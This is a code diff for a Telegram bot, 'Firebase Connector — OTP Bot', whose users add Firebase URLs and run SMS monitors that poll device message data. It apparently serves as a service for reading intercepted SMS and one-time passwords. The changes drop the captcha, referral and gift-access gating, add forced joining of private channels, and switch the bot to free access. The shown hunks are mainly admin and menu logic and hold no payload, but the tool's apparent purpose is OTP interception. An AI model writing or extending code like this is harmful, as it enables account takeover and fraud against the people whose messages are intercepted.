 # ============================================================
-# CAPTCHA INPUT
-# ============================================================
-async def captcha_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if "force_join_captcha" not in context.user_data:
-        return
-    raw = (update.message.text or "").strip()
-    try:
-        answer = int(re.sub(r"\D", "", raw))
-    except ValueError:
-        await update.message.reply_text(
-            _bold_blockquote("❌ 𝗪𝗥𝗢𝗡𝗚 𝗔𝗡𝗦𝗪𝗘𝗥\n\n🧮 Sirf number bhejein."),
-            parse_mode="HTML")
-        return
-    if answer != context.user_data.get("force_join_captcha"):
-        question, new_answer = _new_math_captcha()
-        context.user_data["force_join_captcha"] = new_answer
-        await update.message.reply_text(
-            _bold_blockquote(f"❌ 𝗪𝗥𝗢𝗡𝗚 𝗔𝗡𝗦𝗪𝗘𝗥\n\n🧮 Try: {question} = ?"),
-            parse_mode="HTML")
-        return
-    context.user_data.pop("force_join_captcha", None)
-    context.user_data["force_join_verified"] = True
-    verified_access_users.add(update.effective_user.id)
-
-    await update.message.reply_text(
-        _bold_blockquote("✅ 𝗖𝗔𝗣𝗧𝗖𝗛𝗔 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗\n\n✅ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗚𝗥𝗔𝗡𝗧𝗘𝗗!"),
-        parse_mode="HTML")
-
-    await _send_main_menu(context, update.effective_chat.id,
-                          update.effective_user.first_name or "User",
-                          update.effective_user.id)
-
-
-# ============================================================
 # ADMIN TEXT INPUT
 # ============================================================
 async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2029,95 +1647,6 @@ async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if uid not in ADMIN_IDS or not action:
         return
     text = (update.message.text or "").strip()
-
-    if action == "gift_single":
-        parts = text.split()
-        if len(parts) != 2:
-            await update.message.reply_text(
-                "❌ Format: `<user_id> <hours>`\nExample: `123456789 5`",
-                parse_mode="Markdown", reply_markup=admin_gift_kb())
-            return
-        try:
-            target_uid = int(parts[0].strip())
-            hours = float(parts[1].strip())
-        except (ValueError, TypeError):
-            await update.message.reply_text(
-                "❌ Invalid user ID or hours. Example: `123456789 5`",
-                parse_mode="Markdown", reply_markup=admin_gift_kb())
-            return
-        if hours <= 0 or hours > GIFT_ACCESS_MAX_HOURS:
-            await update.message.reply_text(
-                f"❌ Hours 1 se {GIFT_ACCESS_MAX_HOURS} ke beech hone chahiye.",
-                reply_markup=admin_gift_kb())
-            return
-        seconds = int(hours * 3600)
-        _ensure_user_record(target_uid)
-        grant_access(target_uid, seconds)
-        context.user_data.pop("admin_action", None)
-        remaining = format_remaining_time(target_uid)
-        notified = False
-        try:
-            await context.bot.send_message(
-                chat_id=target_uid,
-                text=_bold_blockquote(
-                    "🎁 𝗔𝗖𝗖𝗘𝗦𝗦 𝗚𝗜𝗙𝗧𝗘𝗗\n\n"
-                    f"⏳ 𝗚𝗶𝗳𝘁𝗲𝗱 𝗧𝗶𝗺𝗲 : {hours:g} 𝗛𝗼𝘂𝗿𝘀\n"
-                    f"📊 𝗡𝗲𝘄 𝗔𝗰𝗰𝗲𝘀𝘀 : {remaining}\n\n"
-                    "✅ 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗯𝗼𝘁."),
-                parse_mode="HTML")
-            notified = True
-        except Exception as exc:
-            logger.info("gift notify failed for %s: %s", target_uid, exc)
-        await update.message.reply_text(
-            f"✅ *Access Gifted*\n\n"
-            f"👤 User: `{target_uid}`\n"
-            f"⏳ Hours: `{hours:g}`\n"
-            f"📊 New Access: `{remaining}`\n"
-            f"📨 Notified: `{'Yes' if notified else 'No'}`",
-            parse_mode="Markdown", reply_markup=admin_panel_kb())
-        return
-
-    if action == "gift_all":
-        try:
-            hours = float(text.strip())
-        except (ValueError, TypeError):
-            await update.message.reply_text(
-                "❌ Invalid hours. Example: `5`",
-                parse_mode="Markdown", reply_markup=admin_gift_kb())
-            return
-        if hours <= 0 or hours > GIFT_ACCESS_MAX_HOURS:
-            await update.message.reply_text(
-                f"❌ Hours 1 se {GIFT_ACCESS_MAX_HOURS} ke beech hone chahiye.",
-                reply_markup=admin_gift_kb())
-            return
-        seconds = int(hours * 3600)
-        context.user_data.pop("admin_action", None)
-        sent = failed = 0
-        for target_uid in list(known_users):
-            _ensure_user_record(target_uid)
-            grant_access(target_uid, seconds)
-            remaining = format_remaining_time(target_uid)
-            try:
-                await context.bot.send_message(
-                    chat_id=target_uid,
-                    text=_bold_blockquote(
-                        "🎁 𝗔𝗖𝗖𝗘𝗦𝗦 𝗚𝗜𝗙𝗧𝗘𝗗\n\n"
-                        f"⏳ 𝗚𝗶𝗳𝘁𝗲𝗱 𝗧𝗶𝗺𝗲 : {hours:g} 𝗛𝗼𝘂𝗿𝘀\n"
-                        f"📊 𝗡𝗲𝘄 𝗔𝗰𝗰𝗲𝘀𝘀 : {remaining}\n\n"
-                        "✅ 𝗬𝗼𝘂 𝗰𝗮𝗻 𝗻𝗼𝘄 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗯𝗼𝘁."),
-                    parse_mode="HTML")
-                sent += 1
-            except Exception as exc:
-                failed += 1
-                logger.info("gift-all notify failed for %s: %s", target_uid, exc)
-        await update.message.reply_text(
-            f"🎁 *Gift All Complete*\n\n"
-            f"⏳ Hours: `{hours:g}`\n"
-            f"👥 Total Users: `{len(known_users)}`\n"
-            f"✅ Notified: `{sent}`\n"
-            f"❌ Failed: `{failed}`",
-            parse_mode="Markdown", reply_markup=admin_panel_kb())
-        return
 
     if action == "add_firebase":
         urls = extract_firebase_urls(text)
@@ -2231,39 +1760,6 @@ async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 reply_markup=admin_panel_kb())
         return
 
-    if action == "add_channel":
-        username = text
-        if username.startswith("https://t.me/"):
-            username = "@" + username.rstrip("/").rsplit("/", 1)[-1].split("?", 1)[0]
-        if not re.fullmatch(r"@[A-Za-z0-9_]{5,32}", username):
-            await update.message.reply_text(
-                "❌ Valid public channel username bhejein, example: @mychannel")
-            return
-        if any(str(c.get("id")).lower() == username.lower() for c in REQUIRED_CHANNELS):
-            await update.message.reply_text("⚠️ Yeh channel already added hai.",
-                                            reply_markup=admin_panel_kb())
-            context.user_data.pop("admin_action", None)
-            return
-        try:
-            chat = await context.bot.get_chat(username)
-            title = chat.title or username
-        except Exception as exc:
-            logger.warning("admin channel validation failed: %s", exc)
-            await update.message.reply_text(
-                "❌ Channel nahi mila ya bot ko access nahi hai.")
-            return
-        REQUIRED_CHANNELS.append({
-            "id": username,
-            "label": title,
-            "url": f"https://t.me/{username.lstrip('@')}",
-        })
-        _save_required_channels()
-        context.user_data.pop("admin_action", None)
-        await update.message.reply_text(
-            f"✅ Force-join channel added: *{title}*",
-            parse_mode="Markdown", reply_markup=admin_panel_kb())
-        return
-
     if action == "broadcast":
         context.user_data.pop("admin_action", None)
         sent = failed = 0
@@ -2277,13 +1773,90 @@ async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"📢 Broadcast complete.\n\n✅ Sent: {sent}\n❌ Failed: {failed}",
             reply_markup=admin_panel_kb())
+        return
+
+    if action == "add_channel":
+        username = text
+        # Handle URL forms
+        if username.startswith("https://t.me/"):
+            username = "@" + username.rstrip("/").rsplit("/", 1)[-1].split("?", 1)[0]
+        elif not username.startswith("@") and not username.startswith("-"):
+            username = "@" + username
+
+        # Validate format: @username OR -100xxxxx (private channel ID)
+        if not (re.fullmatch(r"@[A-Za-z0-9_]{5,32}", username)
+                or re.fullmatch(r"-100\d{6,}", username)):
+            await update.message.reply_text(
+                "❌ Valid channel username bhejein.\n\n"
+                "Examples:\n"
+                "• `@mychannel`\n"
+                "• `https://t.me/mychannel`\n"
+                "• `-1001234567890` (private channel ID)",
+                parse_mode="Markdown", reply_markup=admin_back_kb())
+            return
+
+        if any(str(c.get("id")).lower() == username.lower() for c in REQUIRED_CHANNELS):
+            await update.message.reply_text("⚠️ Yeh channel already added hai.",
+                                            reply_markup=admin_panel_kb())
+            context.user_data.pop("admin_action", None)
+            return
+
+        # Verify bot can access channel
+        try:
+            chat = await context.bot.get_chat(username)
+            title = chat.title or username
+        except Exception as exc:
+            logger.warning("admin channel validation failed: %s", exc)
+            await update.message.reply_text(
+                "❌ Channel nahi mila ya bot ko access nahi hai.\n\n"
+                "⚠️ Bot ko us channel ka *admin* banana zaroori hai.\n"
+                "Ya fir private channel ID `-100xxxxx` use karo.",
+                parse_mode="Markdown", reply_markup=admin_back_kb())
+            return
+
+        # Build join URL
+        join_url = ""
+        invite_link = getattr(chat, "invite_link", None)
+        username_field = getattr(chat, "username", None)
+        if username_field:
+            join_url = f"https://t.me/{username_field}"
+        elif invite_link:
+            join_url = invite_link
+        else:
+            # Try to create invite link
+            try:
+                invite = await context.bot.create_chat_invite_link(chat_id=chat.id)
+                join_url = invite.invite_link
+            except Exception:
+                join_url = ""
+
+        if not join_url:
+            await update.message.reply_text(
+                "❌ Join link generate nahi ho paya.\n\n"
+                "Bot ko us channel me *invite link create* karne ki permission do.",
+                parse_mode="Markdown", reply_markup=admin_back_kb())
+            return
+
+        REQUIRED_CHANNELS.append({
+            "id": str(chat.id),
+            "label": title,
+            "url": join_url,
+        })
+        _save_required_channels()
+        context.user_data.pop("admin_action", None)
+        await update.message.reply_text(
+            f"✅ *Force-Join Channel Added*\n\n"
+            f"📢 Title: `{title}`\n"
+            f"🆔 ID: `{chat.id}`\n"
+            f"🔗 URL: {join_url}\n\n"
+            f"📊 Total Channels: `{len(REQUIRED_CHANNELS)}`",
+            parse_mode="Markdown", reply_markup=admin_panel_kb())
+        return
 
 
 async def text_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if context.user_data.get("admin_action"):
         await admin_text_input(update, context)
-    elif "force_join_captcha" in context.user_data:
-        await captcha_input(update, context)
     else:
         pass
 
@@ -2388,9 +1961,6 @@ async def _sms_monitor_loop(bot, uid: int, chat_id: int, device_id: str,
                 if (time.monotonic() - last_activity) >= SMS_MONITOR_IDLE_TIMEOUT:
                     stop_reason = "idle"
                     break
-            if uid not in ADMIN_IDS and not has_access(uid):
-                stop_reason = "revoked"
-                break
             data, status, err = await fb_get_json(session, url_with_query,
                                                    retries=0, timeout=6)
             if status != "SUCCESS" or not isinstance(data, (dict, list)) or not data:
@@ -2461,25 +2031,11 @@ async def _sms_monitor_loop(bot, uid: int, chat_id: int, device_id: str,
                     text=_bold_blockquote(
                         "⏱️ 𝗠𝗢𝗡𝗜𝗧𝗢𝗥 𝗔𝗨𝗧𝗢-𝗦𝗧𝗢𝗣𝗣𝗘𝗗\n\n"
                         "⚠️ 𝟭𝟬 𝗺𝗶𝗻𝘂𝘁𝗲𝘀 𝘀𝗲 𝗸𝗼𝗶 𝗯𝘂𝘁𝘁𝗼𝗻 𝗻𝗮𝗵𝗶 𝗱𝗮𝗯𝗮𝘆𝗮\n\n"
-                        "🔄 𝗔𝗰𝗰𝗲𝘀𝘀 𝗮𝗴𝗮𝗶𝗻 𝗸𝗲 𝗹𝗶𝘆𝗲 /start 𝗱𝗮𝗯𝗮𝗼 𝗮𝘂𝗿 𝗻𝗮𝘆𝗮 𝗺𝗼𝗻𝗶𝘁𝗼𝗿 𝘀𝘁𝗮𝗿𝘁 𝗸𝗮𝗿𝗼."),
+                        "🔄 𝗡𝗮𝘆𝗮 𝗺𝗼𝗻𝗶𝘁𝗼𝗿 𝘀𝘁𝗮𝗿𝘁 𝗸𝗮𝗿𝗻𝗲 𝗸𝗲 𝗹𝗶𝘆𝗲 /start 𝗱𝗮𝗯𝗮𝗼."),
                     parse_mode="HTML",
                     reply_markup=connect_inline_kb())
             except Exception as e:
                 logger.error(f"idle-stop notify: {e}")
-        elif stop_reason == "revoked":
-            await _delete_monitor_messages(bot, uid, chat_id)
-            await _delete_monitor_status_message(bot, uid, chat_id)
-            try:
-                await bot.send_message(
-                    chat_id=chat_id,
-                    text=_bold_blockquote(
-                        "⛔ 𝗠𝗢𝗡𝗜𝗧𝗢𝗥 𝗦𝗧𝗢𝗣𝗣𝗘𝗗\n\n"
-                        "⚠️ 𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝘃𝗼𝗸𝗲𝗱.\n\n"
-                        "🔗 𝗥𝗲𝗷𝗼𝗶𝗻 𝗮𝗹𝗹 𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘀 𝗮𝗻𝗱 𝘀𝗲𝗻𝗱 /start"),
-                    parse_mode="HTML",
-                    reply_markup=connect_inline_kb())
-            except Exception as e:
-                logger.error(f"revoke-stop notify: {e}")
     except asyncio.CancelledError:
         raise
     except Exception as e:
@@ -2553,7 +2109,7 @@ async def _admin_show_firebases(q):
 
 
 async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global global_fb_list, maintenance_mode, captcha_enabled, _last_refresh_time
+    global global_fb_list, maintenance_mode, _last_refresh_time
     q = update.callback_query
     uid = q.from_user.id
     if not _admin_only(uid):
@@ -2567,37 +2123,6 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             or data.startswith("admin_fb_info:")
             or data.startswith("admin_fb_delete:")):
         _stop_admin_panel_live_task(uid)
-
-    if data == "admin_gift_access":
-        await q.edit_message_text(
-            "🎁 *Gift Access*\n\n"
-            "Kaise gift karna hai?\n\n"
-            "👤 *Single User* — ek user ko hours ke hisaab se access do\n"
-            "👥 *All Users* — sabhi users ko same hours do\n\n"
-            "Neeche se option chuno:",
-            parse_mode="Markdown", reply_markup=admin_gift_kb())
-        return
-
-    if data == "admin_gift_single":
-        context.user_data["admin_action"] = "gift_single"
-        await q.edit_message_text(
-            "👤 *Gift Single User*\n\n"
-            "Format bhejein:\n`<user_id> <hours>`\n\n"
-            "Example:\n`123456789 5`\n\n"
-            "📌 *Hours float bhi ho sakte hain* (e.g. `0.5` = 30 min)",
-            parse_mode="Markdown", reply_markup=admin_gift_kb())
-        return
-
-    if data == "admin_gift_all":
-        context.user_data["admin_action"] = "gift_all"
-        await q.edit_message_text(
-            "👥 *Gift All Users*\n\n"
-            f"Sirf hours likh kar bhejein.\n"
-            f"Total users: `{len(known_users)}`\n\n"
-            "Example:\n`5`\n\n"
-            "📌 *Hours float bhi ho sakte hain* (e.g. `0.5` = 30 min)",
-            parse_mode="Markdown", reply_markup=admin_gift_kb())
-        return
 
     if data == "admin_toggle_maintenance":
         maintenance_mode = not maintenance_mode
@@ -2619,14 +2144,6 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML", reply_markup=admin_panel_kb())
         return
 
-    if data == "admin_toggle_captcha":
-        captcha_enabled = not captcha_enabled
-        _save_captcha_enabled()
-        await q.edit_message_text(
-            f"🔐 Captcha: {'ON' if captcha_enabled else 'OFF'}",
-            reply_markup=admin_panel_kb())
-        return
-
     if data == "admin_back":
         context.user_data.pop("admin_action", None)
         await q.edit_message_text(
@@ -2639,12 +2156,12 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "📊 *Bot Statistics*\n\n"
             f"👥 Total users: `{len(known_users)}`\n"
             f"🔗 Firebases: `{len(global_fb_list)}`\n"
-            f"🔗 Force-join channels: `{len(REQUIRED_CHANNELS)}`\n"
+            f"📢 Force-join channels: `{len(REQUIRED_CHANNELS)}`\n"
             f"💾 Active sessions: `{len(user_sessions)}`\n"
             f"📨 Active SMS monitors: `{len(sms_monitor_tasks)}`\n"
             f"⚡ Auto-refresh: `{ADMIN_DEVICE_REFRESH_INTERVAL}s`\n"
             f"🌐 Flask: `{FLASK_HOST}:{FLASK_PORT}`\n"
-            f"🔐 Captcha: `{'ON' if captcha_enabled else 'OFF'}`",
+            f"🎁 Mode: `FREE`",
             parse_mode="Markdown", reply_markup=admin_back_kb())
         return
 
@@ -2731,27 +2248,6 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await q.answer("Load failed.", show_alert=True)
         return
 
-    if data == "admin_channels":
-        if REQUIRED_CHANNELS:
-            lines = ["📋 *Force-Join Channels*\n"]
-            for i, channel in enumerate(REQUIRED_CHANNELS, 1):
-                lines.append(f"{i}. `{channel.get('label', channel.get('id'))}`")
-            text = "\n".join(lines)
-        else:
-            text = "📋 *Force-Join Channels*\n\nNo channels configured."
-        await q.edit_message_text(text, parse_mode="Markdown",
-                                  reply_markup=admin_channels_kb())
-        return
-
-    if data == "admin_add_channel":
-        context.user_data["admin_action"] = "add_channel"
-        await q.edit_message_text(
-            "➕ *Add Force-Join Channel*\n\n"
-            "Channel username bhejein, example: `@mychannel`\n"
-            "Bot ko us channel ka administrator hona chahiye.",
-            parse_mode="Markdown", reply_markup=admin_back_kb())
-        return
-
     if data == "admin_broadcast":
         context.user_data["admin_action"] = "broadcast"
         await q.edit_message_text(
@@ -2760,13 +2256,49 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="Markdown", reply_markup=admin_back_kb())
         return
 
+    if data == "admin_add_channel":
+        context.user_data["admin_action"] = "add_channel"
+        await q.edit_message_text(
+            "➕ *Add Force-Join Channel*\n\n"
+            "Format bhejein:\n\n"
+            "• `@channelusername`\n"
+            "• `https://t.me/channelusername`\n"
+            "• `-1001234567890` (private channel)\n\n"
+            "⚠️ *Bot ko us channel ka admin banana zaroori hai.*\n\n"
+            "Public channel ke liye username kaafi hai.\n"
+            "Private channel ke liye ID do.",
+            parse_mode="Markdown", reply_markup=admin_back_kb())
+        return
+
+    if data == "admin_channels":
+        if REQUIRED_CHANNELS:
+            lines = ["📋 *Force-Join Channels*\n"]
+            for i, channel in enumerate(REQUIRED_CHANNELS, 1):
+                lines.append(f"*{i}.* `{channel.get('label', channel.get('id'))}`")
+                lines.append(f"     🆔 `{channel.get('id')}`")
+                lines.append(f"     🔗 {channel.get('url', '')}")
+                lines.append("")
+            text = "\n".join(lines)
+        else:
+            text = ("📋 *Force-Join Channels*\n\n"
+                    "❌ Abhi koi channel add nahi hai.\n\n"
+                    "➡️ *ADD JOIN CHANNEL* se add karo.")
+        await q.edit_message_text(text, parse_mode="Markdown",
+                                  reply_markup=admin_channels_kb())
+        return
+
     if data.startswith("admin_remove_channel:"):
         try:
             index = int(data.split(":", 1)[1])
+            if index < 0 or index >= len(REQUIRED_CHANNELS):
+                await q.answer("Invalid channel.", show_alert=True)
+                return
             removed = REQUIRED_CHANNELS.pop(index)
             _save_required_channels()
             await q.edit_message_text(
-                f"✅ Removed: `{removed.get('label', removed.get('id'))}`",
+                f"✅ *Channel Removed*\n\n"
+                f"📢 `{removed.get('label', removed.get('id'))}`\n\n"
+                f"📊 Remaining: `{len(REQUIRED_CHANNELS)}`",
                 parse_mode="Markdown", reply_markup=admin_channels_kb())
         except (ValueError, IndexError):
             await q.answer("Invalid channel.", show_alert=True)
@@ -2856,14 +2388,12 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     await q.answer()
 
+    # Handle force verify
     if q.data == "force_verify":
         await force_verify_callback(update, context)
         return
 
     if not await _require_access(update, context, edit_target=q.message):
-        uid_check = q.from_user.id
-        if uid_check in sms_monitor_state and uid_check not in ADMIN_IDS:
-            stop_sms_monitor(uid_check)
         return
 
     uid = q.from_user.id
@@ -3131,83 +2661,19 @@ async def scan_and_show(update, context, edit_target=None, fb_idx=None):
 
 
 # ============================================================
-# MAINTENANCE LOOP
+# MAINTENANCE LOOP (only cleanup now)
 # ============================================================
 async def _maintenance_loop(bot):
-    loop_count = 0
     while True:
         try:
-            await asyncio.sleep(ACCESS_CHECK_INTERVAL)
-            loop_count += 1
-            if loop_count % max(1, CLEANUP_INTERVAL // ACCESS_CHECK_INTERVAL) == 0:
-                gc.collect()
+            await asyncio.sleep(CLEANUP_INTERVAL)
+            gc.collect()
             for uid, task in list(sms_monitor_tasks.items()):
                 if task.done():
                     sms_monitor_tasks.pop(uid, None)
             for uid, task in list(admin_panel_live_tasks.items()):
                 if task.done():
                     admin_panel_live_tasks.pop(uid, None)
-
-            for uid in list(sms_monitor_state.keys()):
-                if uid in ADMIN_IDS:
-                    continue
-                if not has_access(uid):
-                    logger.info("[MONITOR] auto-stop uid=%s reason=access_expired", uid)
-                    stop_sms_monitor(uid)
-                    try:
-                        await bot.send_message(
-                            chat_id=uid,
-                            text=_bold_blockquote(
-                                "⛔ 𝗠𝗢𝗡𝗜𝗧𝗢𝗥 𝗦𝗧𝗢𝗣𝗣𝗘𝗗\n\n"
-                                "⚠️ 𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱.\n\n"
-                                "🔗 𝗥𝗲𝗳𝗲𝗿 𝗳𝗿𝗶𝗲𝗻𝗱𝘀 𝘁𝗼 𝗴𝗲𝘁 𝗺𝗼𝗿𝗲 𝗮𝗰𝗰𝗲𝘀𝘀.\n"
-                                "📌 𝗦𝗲𝗻𝗱 /start 𝘁𝗼 𝗿𝗲𝘀𝘁𝗮𝗿𝘁."),
-                            parse_mode="HTML",
-                            reply_markup=connect_inline_kb())
-                    except Exception as exc:
-                        logger.info("could not notify revoked monitor %s: %s", uid, exc)
-
-            if REQUIRED_CHANNELS:
-                for uid in list(known_users):
-                    joined, missing = await _check_required_channels(bot, uid)
-                    previous = user_access_state.get(uid)
-                    user_access_state[uid] = joined
-                    if previous is True and not joined:
-                        verified_access_users.discard(uid)
-                        if uid in sms_monitor_state and uid not in ADMIN_IDS:
-                            logger.info("[MONITOR] auto-stop uid=%s reason=channel_leave", uid)
-                            stop_sms_monitor(uid)
-                        referrer_id = await check_referred_user_left(uid)
-                        if referrer_id:
-                            try:
-                                await bot.send_message(
-                                    chat_id=referrer_id,
-                                    text=_bold_blockquote(
-                                        "⚠️ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗥𝗘𝗩𝗢𝗞𝗘𝗗\n\n"
-                                        "👤 𝗔 𝗿𝗲𝗳𝗲𝗿𝗿𝗲𝗱 𝘂𝘀𝗲𝗿 𝗹𝗲𝗳𝘁 𝘁𝗵𝗲 𝗰𝗵𝗮𝗻𝗻𝗲𝗹\n\n"
-                                        "📌 𝗥𝗲𝗮𝘀𝗼𝗻 : Channel Leave\n\n"
-                                        "🎁 𝗥𝗘𝗙𝗘𝗥 𝗔𝗚𝗔𝗜𝗡 𝗧𝗢 𝗚𝗘𝗧 𝗔𝗖𝗖𝗘𝗦𝗦"),
-                                    parse_mode="HTML")
-                            except Exception as exc:
-                                logger.info(
-                                    "could not notify referrer %s: %s", referrer_id, exc)
-                            if referrer_id in sms_monitor_state and referrer_id not in ADMIN_IDS:
-                                logger.info(
-                                    "[MONITOR] auto-stop referrer uid=%s reason=referral_revoked",
-                                    referrer_id)
-                                stop_sms_monitor(referrer_id)
-                        try:
-                            await bot.send_message(
-                                chat_id=uid,
-                                text=_bold_blockquote(
-                                    "⚠️ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗥𝗘𝗦𝗧𝗥𝗜𝗖𝗧𝗘𝗗\n\n"
-                                    "📌 𝗥𝗲𝗮𝘀𝗼𝗻 : Channel Leave\n\n"
-                                    "🔗 𝗥𝗲𝗷𝗼𝗶𝗻 𝗮𝗹𝗹 𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘀 𝘁𝗼 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲."),
-                                parse_mode="HTML",
-                                reply_markup=_force_join_kb())
-                            logger.info("access restricted uid=%s (channel leave)", uid)
-                        except Exception as exc:
-                            logger.info("could not restrict notify %s: %s", uid, exc)
         except asyncio.CancelledError:
             raise
         except Exception as e:
@@ -3248,18 +2714,16 @@ async def _telegram_error_handler(update: object, context: ContextTypes.DEFAULT_
 def main():
     global bot_instance
     print("=" * 60)
-    print("  Firebase Connector — OTP Bot FINAL v2 (Flask)")
+    print("  Firebase Connector — OTP Bot FREE + Force Join")
     print(f"  Max Firebases: {MAX_FIREBASES}")
     print(f"  Global FBs: {len(global_fb_list)}")
-    print(f"  Force-join: {len(REQUIRED_CHANNELS)}")
-    print(f"  Captcha: {'ON' if captcha_enabled else 'OFF'}")
-    print(f"  Referral: 1 refer = {REFERRAL_HOURS} hours")
+    print(f"  Force-join channels: {len(REQUIRED_CHANNELS)}")
+    print(f"  Mode: 🎁 FREE (No Refer, No Captcha, No Credits)")
     print(f"  Auto-refresh: {ADMIN_DEVICE_REFRESH_INTERVAL}s ⚡")
     print(f"  SMS Monitor idle timeout: {SMS_MONITOR_IDLE_TIMEOUT // 60} minutes")
     print(f"  Flask keep-alive: {FLASK_HOST}:{FLASK_PORT} 🌐")
     print("=" * 60)
 
-    # ⚡ Flask keep-alive server start karo (background daemon thread)
     start_flask_thread()
 
     app = Application.builder().token(BOT_TOKEN).build()
@@ -3269,7 +2733,7 @@ def main():
     app.add_handler(CommandHandler("admin", admin_cmd))
     app.add_handler(CallbackQueryHandler(
         admin_callback,
-        pattern=r"^admin_(back|stats|channels|add_channel|add_firebase|manage_fb|broadcast|toggle_maintenance|toggle_captcha|remove_channel:\d+|fb_refresh:\d+|fb_delete:\d+|fb_info:\d+|gift_access|gift_single|gift_all)$"))
+        pattern=r"^admin_(back|stats|add_firebase|manage_fb|broadcast|toggle_maintenance|add_channel|channels|remove_channel:\d+|fb_refresh:\d+|fb_delete:\d+|fb_info:\d+)$"))
     app.add_handler(CallbackQueryHandler(generate_number_callback,
                                           pattern="^generate_number$"))
     app.add_handler(CallbackQueryHandler(
